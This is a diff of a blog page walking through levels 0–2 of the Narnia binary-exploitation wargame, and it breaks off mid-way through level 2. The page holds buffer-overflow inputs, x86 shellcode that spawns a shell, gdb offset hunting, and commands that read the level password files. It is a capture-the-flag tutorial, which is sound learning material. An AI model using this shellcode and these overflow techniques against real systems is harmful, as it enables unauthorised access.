@@ -1,54 +1,55 @@
-	<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html>
 <head>
-  <link href="http://gmpg.org/xfn/11" rel="profile">
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.15" />
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Solving Narnia Part 1 - Unlogic</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <link rel="canonical" href="http://unlogic.co.uk/2015/04/08/solving-narnia-part1/">
 
   
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-
-  <title> Solving Narnia Part 1 &middot; Unlogic </title>
+  
 
   
-  <link rel="stylesheet" href="http://unlogic.co.uk/css/poole.css">
-  <link rel="stylesheet" href="http://unlogic.co.uk/css/syntax.css">
-  <link rel="stylesheet" href="http://unlogic.co.uk/css/hyde.css">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  
 
   
-  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://unlogic.co.uk/apple-touch-icon-144-precomposed.png">
-  <link rel="shortcut icon" href="http://unlogic.co.uk/favicon.png">
-
   
-  <link href="" rel="alternate" type="application/rss+xml" title="Unlogic" />
+
+  <link rel="stylesheet" type="text/css" href="http://unlogic.co.uk//css/combined-min.css">
+
 </head>
+<body class="">
 
-	<body class="">
-		<div class="sidebar">
-  <div class="container sidebar-sticky">
-    <div class="sidebar-about">
-      <a href="http://unlogic.co.uk/"><h1>Unlogic</h1></a>
-      <p class="lead">
-       I have a keyboard, a compiler, and a whole load of luck 
-      </p>
+<div class="site-wrap">
+  <header class="site-header px2 px-responsive">
+  <div class="mt2 wrap">
+    <div class="measure">
+      <a href="http://unlogic.co.uk/" class="site-title">Unlogic</a>
+      <nav class="site-nav right">
+      <a href="http://unlogic.co.uk/tags">Tags</a>
+
+</form>
+
+      </nav>
+      <div class="clearfix"></div>
     </div>
-
-    <ul class="sidebar-nav">
-      <li><a href="http://unlogic.co.uk/">Home</a> </li>
-      
-    </ul>
-
-    <p>Sven Steinbauer</p>
   </div>
-</div>
+</header>
 
+  <div class="post p2 p-responsive wrap" role="main">
+    <div class="measure">
+      <div class="post-header mb2">
+        <h1 class="py2">Solving Narnia Part 1</h1>
+        <span class="post-meta">Apr 8, 2015 by </span><br>
+        
+      </div>
 
-		<div class="content container">
-			<div class="post">
-			 	<h1>Solving Narnia Part 1</h1>
-			  <span class="post-date">Wed, Apr 8, 2015</span>
-			      
+      <article class="post-content">
+      
 
 <p>Next up we take on <a href="http://overthewire.org/wargames/narnia/">Narnia</a>. This is a
 binary exploit centered wargame, so fire up your debuggers and let&rsquo;s smash those
@@ -61,7 +62,7 @@ the exercises yourself (or find them elsewhere :))</p>
 
 <h2 id="level-00:dadecd8e397495e170ebcbe00dd8239d">Level 00</h2>
 
-<table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
  2
  3
  4
@@ -83,29 +84,29 @@ the exercises yourself (or find them elsewhere :))</p>
 20
 21
 22
-23</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
-<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+23</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
 
-<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(){</span>
-        <span style="color: #66d9ef">long</span> <span style="color: #f8f8f2">val</span><span style="color: #f92672">=</span><span style="color: #ae81ff">0x41414141</span><span style="color: #f8f8f2">;</span>
-        <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">20</span><span style="color: #f8f8f2">];</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+        <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
 
-        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Here is your chance: &quot;</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #f8f8f2">scanf(</span><span style="color: #e6db74">&quot;%24s&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">buf);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here is your chance: &quot;</span><span class="p">);</span>
+        <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%24s&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
 
-        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;buf: %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,buf);</span>
-        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;val: 0x%08x</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,val);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;val: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
 
-        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(val</span><span style="color: #f92672">==</span><span style="color: #ae81ff">0xdeadbeef</span><span style="color: #f8f8f2">)</span>
-                <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
-                <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;WAY OFF!!!!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
-                <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #f8f8f2">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+                <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+        <span class="k">else</span> <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WAY OFF!!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
 
-        <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
-<span style="color: #f8f8f2">}</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></div>
 </td></tr></table>
 
@@ -118,56 +119,56 @@ at <code>val</code>&rsquo;s location.</p>
 
 <p>So let&rsquo;s try it</p>
 
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia0@melinda:/narnia$ python -c <span style="color: #e6db74">&quot;print &#39;C&#39;*50&quot;</span> <span style="color: #f8f8f2">|</span> ./narnia0 
-Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
-Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC
-val: 0x43434343
-WAY OFF!!!!
-</pre></div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia0@melinda:/narnia$</span> python -c <span class="s2">&quot;print &#39;C&#39;*50&quot;</span> <span class="p">|</span> ./narnia0 
+<span class="go">Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
+<span class="go">Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC</span>
+<span class="go">val: 0x43434343</span>
+<span class="go">WAY OFF!!!!</span>
+</code></pre></div>
 
 
 <p>Right, we can confirm that we are able to change the value of <code>val</code>. Let&rsquo;s
 tread a bit more carefully and try to see if we can do it more accurately</p>
 
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia0@melinda:/narnia$ python -c <span style="color: #e6db74">&quot;print &#39;C&#39;*20 + &#39;BBBB&#39;&quot;</span> <span style="color: #f8f8f2">|</span> ./narnia0 
-Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
-Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB
-val: 0x42424242
-WAY OFF!!!!
-</pre></div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia0@melinda:/narnia$</span> python -c <span class="s2">&quot;print &#39;C&#39;*20 + &#39;BBBB&#39;&quot;</span> <span class="p">|</span> ./narnia0 
+<span class="go">Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
+<span class="go">Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB</span>
+<span class="go">val: 0x42424242</span>
+<span class="go">WAY OFF!!!!</span>
+</code></pre></div>
 
 
 <p>So there is no space between <code>val</code> and <code>buf</code>, therefore 20 characters plus a
 further 4 is enough to change val. Let&rsquo;s write in the correct value, reversed of
 course because of the endian notation</p>
 
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia0@melinda:/narnia$ python -c <span style="color: #e6db74">&quot;print &#39;C&#39;*20 + &#39;\xef\xbe\xad\xde&#39;&quot;</span> <span style="color: #f8f8f2">|</span> ./narnia0
-Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
-Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
-val: 0xdeadbeef
-narnia0@melinda:/narnia$
-</pre></div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia0@melinda:/narnia$</span> python -c <span class="s2">&quot;print &#39;C&#39;*20 + &#39;\xef\xbe\xad\xde&#39;&quot;</span> <span class="p">|</span> ./narnia0
+<span class="go">Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
+<span class="go">Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ</span>
+<span class="go">val: 0xdeadbeef</span>
+<span class="gp">narnia0@melinda:/narnia$</span>
+</code></pre></div>
 
 
 <p>We did it&hellip;. but wait, where&rsquo;s the shell? It&rsquo;s closed, that&rsquo;s where it is. We
 need to keep it open. The trick is to append the <code>cat</code> command to the input</p>
 
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia0@melinda:/narnia$ <span style="color: #f92672">(</span>python -c <span style="color: #e6db74">&quot;print &#39;C&#39;*20 + &#39;\xef\xbe\xad\xde&#39;&quot;</span><span style="color: #f8f8f2">;</span> cat<span style="color: #f92672">)</span> <span style="color: #f8f8f2">|</span> ./narnia0
-Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
-Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
-val: 0xdeadbeef
-id
-uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
-whoami
-narnia1
-cat /etc/narnia_pass/narnia1
-[password]
-</pre></div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia0@melinda:/narnia$</span> <span class="o">(</span>python -c <span class="s2">&quot;print &#39;C&#39;*20 + &#39;\xef\xbe\xad\xde&#39;&quot;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./narnia0
+<span class="go">Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
+<span class="go">Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ</span>
+<span class="go">val: 0xdeadbeef</span>
+<span class="go">id</span>
+<span class="go">uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)</span>
+<span class="go">whoami</span>
+<span class="go">narnia1</span>
+<span class="go">cat /etc/narnia_pass/narnia1</span>
+<span class="go">[password]</span>
+</code></pre></div>
 
 
 <h2 id="level-01:dadecd8e397495e170ebcbe00dd8239d">Level 01</h2>
 
-<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
+<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
  2
  3
  4
@@ -182,22 +183,22 @@ cat /etc/narnia_pass/narnia1
 13
 14
 15
-16</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+16</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
 
-<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(){</span>
-	<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">ret)();</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>
 
-	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(getenv(</span><span style="color: #e6db74">&quot;EGG&quot;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">==</span><span style="color: #f8f8f2">NULL){</span>    
-		<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Give me something to execute at the env-variable EGG</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
-		<span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-	<span style="color: #f8f8f2">}</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>    
+		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
 
-	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Trying to execute EGG!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
-	<span style="color: #f8f8f2">ret</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getenv(</span><span style="color: #e6db74">&quot;EGG&quot;</span><span style="color: #f8f8f2">);</span>
-	<span style="color: #f8f8f2">ret();</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
+	<span class="n">ret</span><span class="p">();</span>
 
-	<span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
-<span style="color: #f8f8f2">}</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></div>
 </td></tr></table></p>
 
@@ -206,19 +207,19 @@ we want executed. We can&rsquo;t just pass <code>/bin/bash</code> as it&rsquo;s 
 we give it as a function. Ideally we want a shell, so what we need in this case
 is the shellcode to do just that.</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia1@melinda:/narnia$ <span style="color: #f8f8f2">export EGG</span><span style="color: #f92672">=</span><span style="color: #66d9ef">$(</span>python -c<span style="color: #e6db74">&#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;&#39;</span><span style="color: #66d9ef">)</span>
-narnia1@melinda:/narnia$ ./narnia1
-Trying to execute EGG!
-$ whoami
-narnia2
-$ cat /etc/narnia_pass/narnia2
-[password]
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia1@melinda:/narnia$</span> <span class="nb">export </span><span class="nv">EGG</span><span class="o">=</span><span class="k">$(</span>python -c<span class="s1">&#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;&#39;</span><span class="k">)</span>
+<span class="gp">narnia1@melinda:/narnia$</span> ./narnia1
+<span class="go">Trying to execute EGG!</span>
+<span class="gp">$</span> whoami
+<span class="go">narnia2</span>
+<span class="gp">$</span> cat /etc/narnia_pass/narnia2
+<span class="go">[password]</span>
+</code></pre></div>
 </p>
 
 <h2 id="level-02:dadecd8e397495e170ebcbe00dd8239d">Level 02</h2>
 
-<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
+<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
  2
  3
  4
@@ -233,22 +234,22 @@ $ cat /etc/narnia_pass/narnia2
 13
 14
 15
-16</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
-<span style="color: #75715e">#include &lt;string.h&gt;</span>
-<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+16</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
 
-<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span> <span style="color: #f8f8f2">argv[]){</span>
-	<span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">128</span><span style="color: #f8f8f2">];</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
 
-	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">){</span>
-		<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Usage: %s argument</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
-		<span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-	<span style="color: #f8f8f2">}</span>
-	<span style="color: #f8f8f2">strcpy(buf,argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
-	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buf);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
 
-	<span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
-<span style="color: #f8f8f2">}</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></div>
 </td></tr></table></p>
 
@@ -265,106 +266,106 @@ of metasploit&rsquo;s one. I&rsquo;ll create a payload big enugh to overflow the
 buffer and then check the value of <code>EIP</code>. Pasting that back into the pattern
 generator will tell us at what location in the pattern the string occurs.</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">local $] ./pattern.py 150
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
-Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">local $] ./pattern.py 150</span>
+<span class="go">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5</span>
+<span class="go">Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span>
+</code></pre></div>
 </p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia2@melinda:/narnia$ gdb -q narnia2
-Reading symbols from narnia2...(no debugging symbols found)...done.
-(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
-Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia2@melinda:/narnia$</span> gdb -q narnia2
+<span class="go">Reading symbols from narnia2...(no debugging symbols found)...done.</span>
+<span class="go">(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span>
+<span class="go">Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span>
 
-Program received signal SIGSEGV, Segmentation fault.
-0x37654136 in ?? ()
-(gdb) info reg
-eax            0x0	0
-ecx            0x0	0
-edx            0xf7fcb898	-134432616
-ebx            0xf7fca000	-134438912
-esp            0xffffd640	0xffffd640
-ebp            0x65413565	0x65413565
-esi            0x0	0
-edi            0x0	0
-eip            0x37654136	0x37654136
-eflags         0x10282	[ SF IF RF ]
-cs             0x23	35
-ss             0x2b	43
-ds             0x2b	43
-es             0x2b	43
-fs             0x0	0
-gs             0x63	99
-</pre></div>
+<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
+<span class="go">0x37654136 in ?? ()</span>
+<span class="go">(gdb) info reg</span>
+<span class="go">eax            0x0	0</span>
+<span class="go">ecx            0x0	0</span>
+<span class="go">edx            0xf7fcb898	-134432616</span>
+<span class="go">ebx            0xf7fca000	-134438912</span>
+<span class="go">esp            0xffffd640	0xffffd640</span>
+<span class="go">ebp            0x65413565	0x65413565</span>
+<span class="go">esi            0x0	0</span>
+<span class="go">edi            0x0	0</span>
+<span class="go">eip            0x37654136	0x37654136</span>
+<span class="go">eflags         0x10282	[ SF IF RF ]</span>
+<span class="go">cs             0x23	35</span>
+<span class="go">ss             0x2b	43</span>
+<span class="go">ds             0x2b	43</span>
+<span class="go">es             0x2b	43</span>
+<span class="go">fs             0x0	0</span>
+<span class="go">gs             0x63	99</span>
+</code></pre></div>
 </p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">local $] ./pattern.py 0x37654136
-Pattern 0x37654136 first occurrence at position 140 in pattern.
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">local $] ./pattern.py 0x37654136</span>
+<span class="go">Pattern 0x37654136 first occurrence at position 140 in pattern.</span>
+</code></pre></div>
 </p>
 
 <p>We can control <code>EIP</code> with whatever we put at position 140 of our payload. But
 what do we put there? Well for that we need to figure out where the rest of our
 data is going. Using a known payload let&rsquo;s see where our input ends up:</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) run $(python -c &quot;print &#39;a&#39; * 140 + &#39;b&#39; * 4&quot;)
-Starting program: /games/narnia/narnia2 $(python -c &quot;print &#39;a&#39; * 140 + &#39;b&#39; * 4&quot;)
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">(gdb) run $(python -c &quot;print &#39;a&#39; * 140 + &#39;b&#39; * 4&quot;)</span>
+<span class="go">Starting program: /games/narnia/narnia2 $(python -c &quot;print &#39;a&#39; * 140 + &#39;b&#39; * 4&quot;)</span>
 
-Program received signal SIGSEGV, Segmentation fault.
-0x62626262 in ?? ()
-(gdb) x/200x $esp
-(gdb) x/200x $esp
-0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacea
-0xffffd660:	0x00000002	0xffffd6e4	0xffffd684	0x08049768
-0xffffd670:	0x0804821c	0xf7fca000	0x00000000	0x00000000
-0xffffd680:	0x00000000	0xed18585e	0xd520bc4e	0x00000000
-0xffffd690:	0x00000000	0x00000000	0x00000002	0x08048360
-0xffffd6a0:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
-0xffffd6b0:	0x00000002	0x08048360	0x00000000	0x08048381
-0xffffd6c0:	0x0804845d	0x00000002	0xffffd6e4	0x080484d0
-0xffffd6d0:	0x08048540	0xf7feb180	0xffffd6dc	0x0000001c
-0xffffd6e0:	0x00000002	0xffffd812	0xffffd828	0x00000000
-0xffffd6f0:	0xffffd8b9	0xffffd8cd	0xffffd8dd	0xffffd8f0
-0xffffd700:	0xffffd913	0xffffd927	0xffffd930	0xffffd93d
-0xffffd710:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
-0xffffd720:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
-0xffffd730:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
-0xffffd740:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
-0xffffd750:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
-0xffffd760:	0x00000010	0x1f898b75	0x00000006	0x00001000
-0xffffd770:	0x00000011	0x00000064	0x00000003	0x08048034
-0xffffd780:	0x00000004	0x00000020	0x00000005	0x00000008
-0xffffd790:	0x00000007	0xf7fdc000	0x00000008	0x00000000
-0xffffd7a0:	0x00000009	0x08048360	0x0000000b	0x000036b2
-0xffffd7b0:	0x0000000c	0x000036b2	0x0000000d	0x000036b2
-0xffffd7c0:	0x0000000e	0x000036b2	0x00000017	0x00000000
-0xffffd7d0:	0x00000019	0xffffd7fb	0x0000001f	0xffffdfe2
-0xffffd7e0:	0x0000000f	0xffffd80b	0x00000000	0x00000000
-0xffffd7f0:	0x00000000	0x00000000	0xe8000000	0x7c03ba19
-0xffffd800:	0x2bd0895a	0x3866226d	0x69ad5957	0x00363836
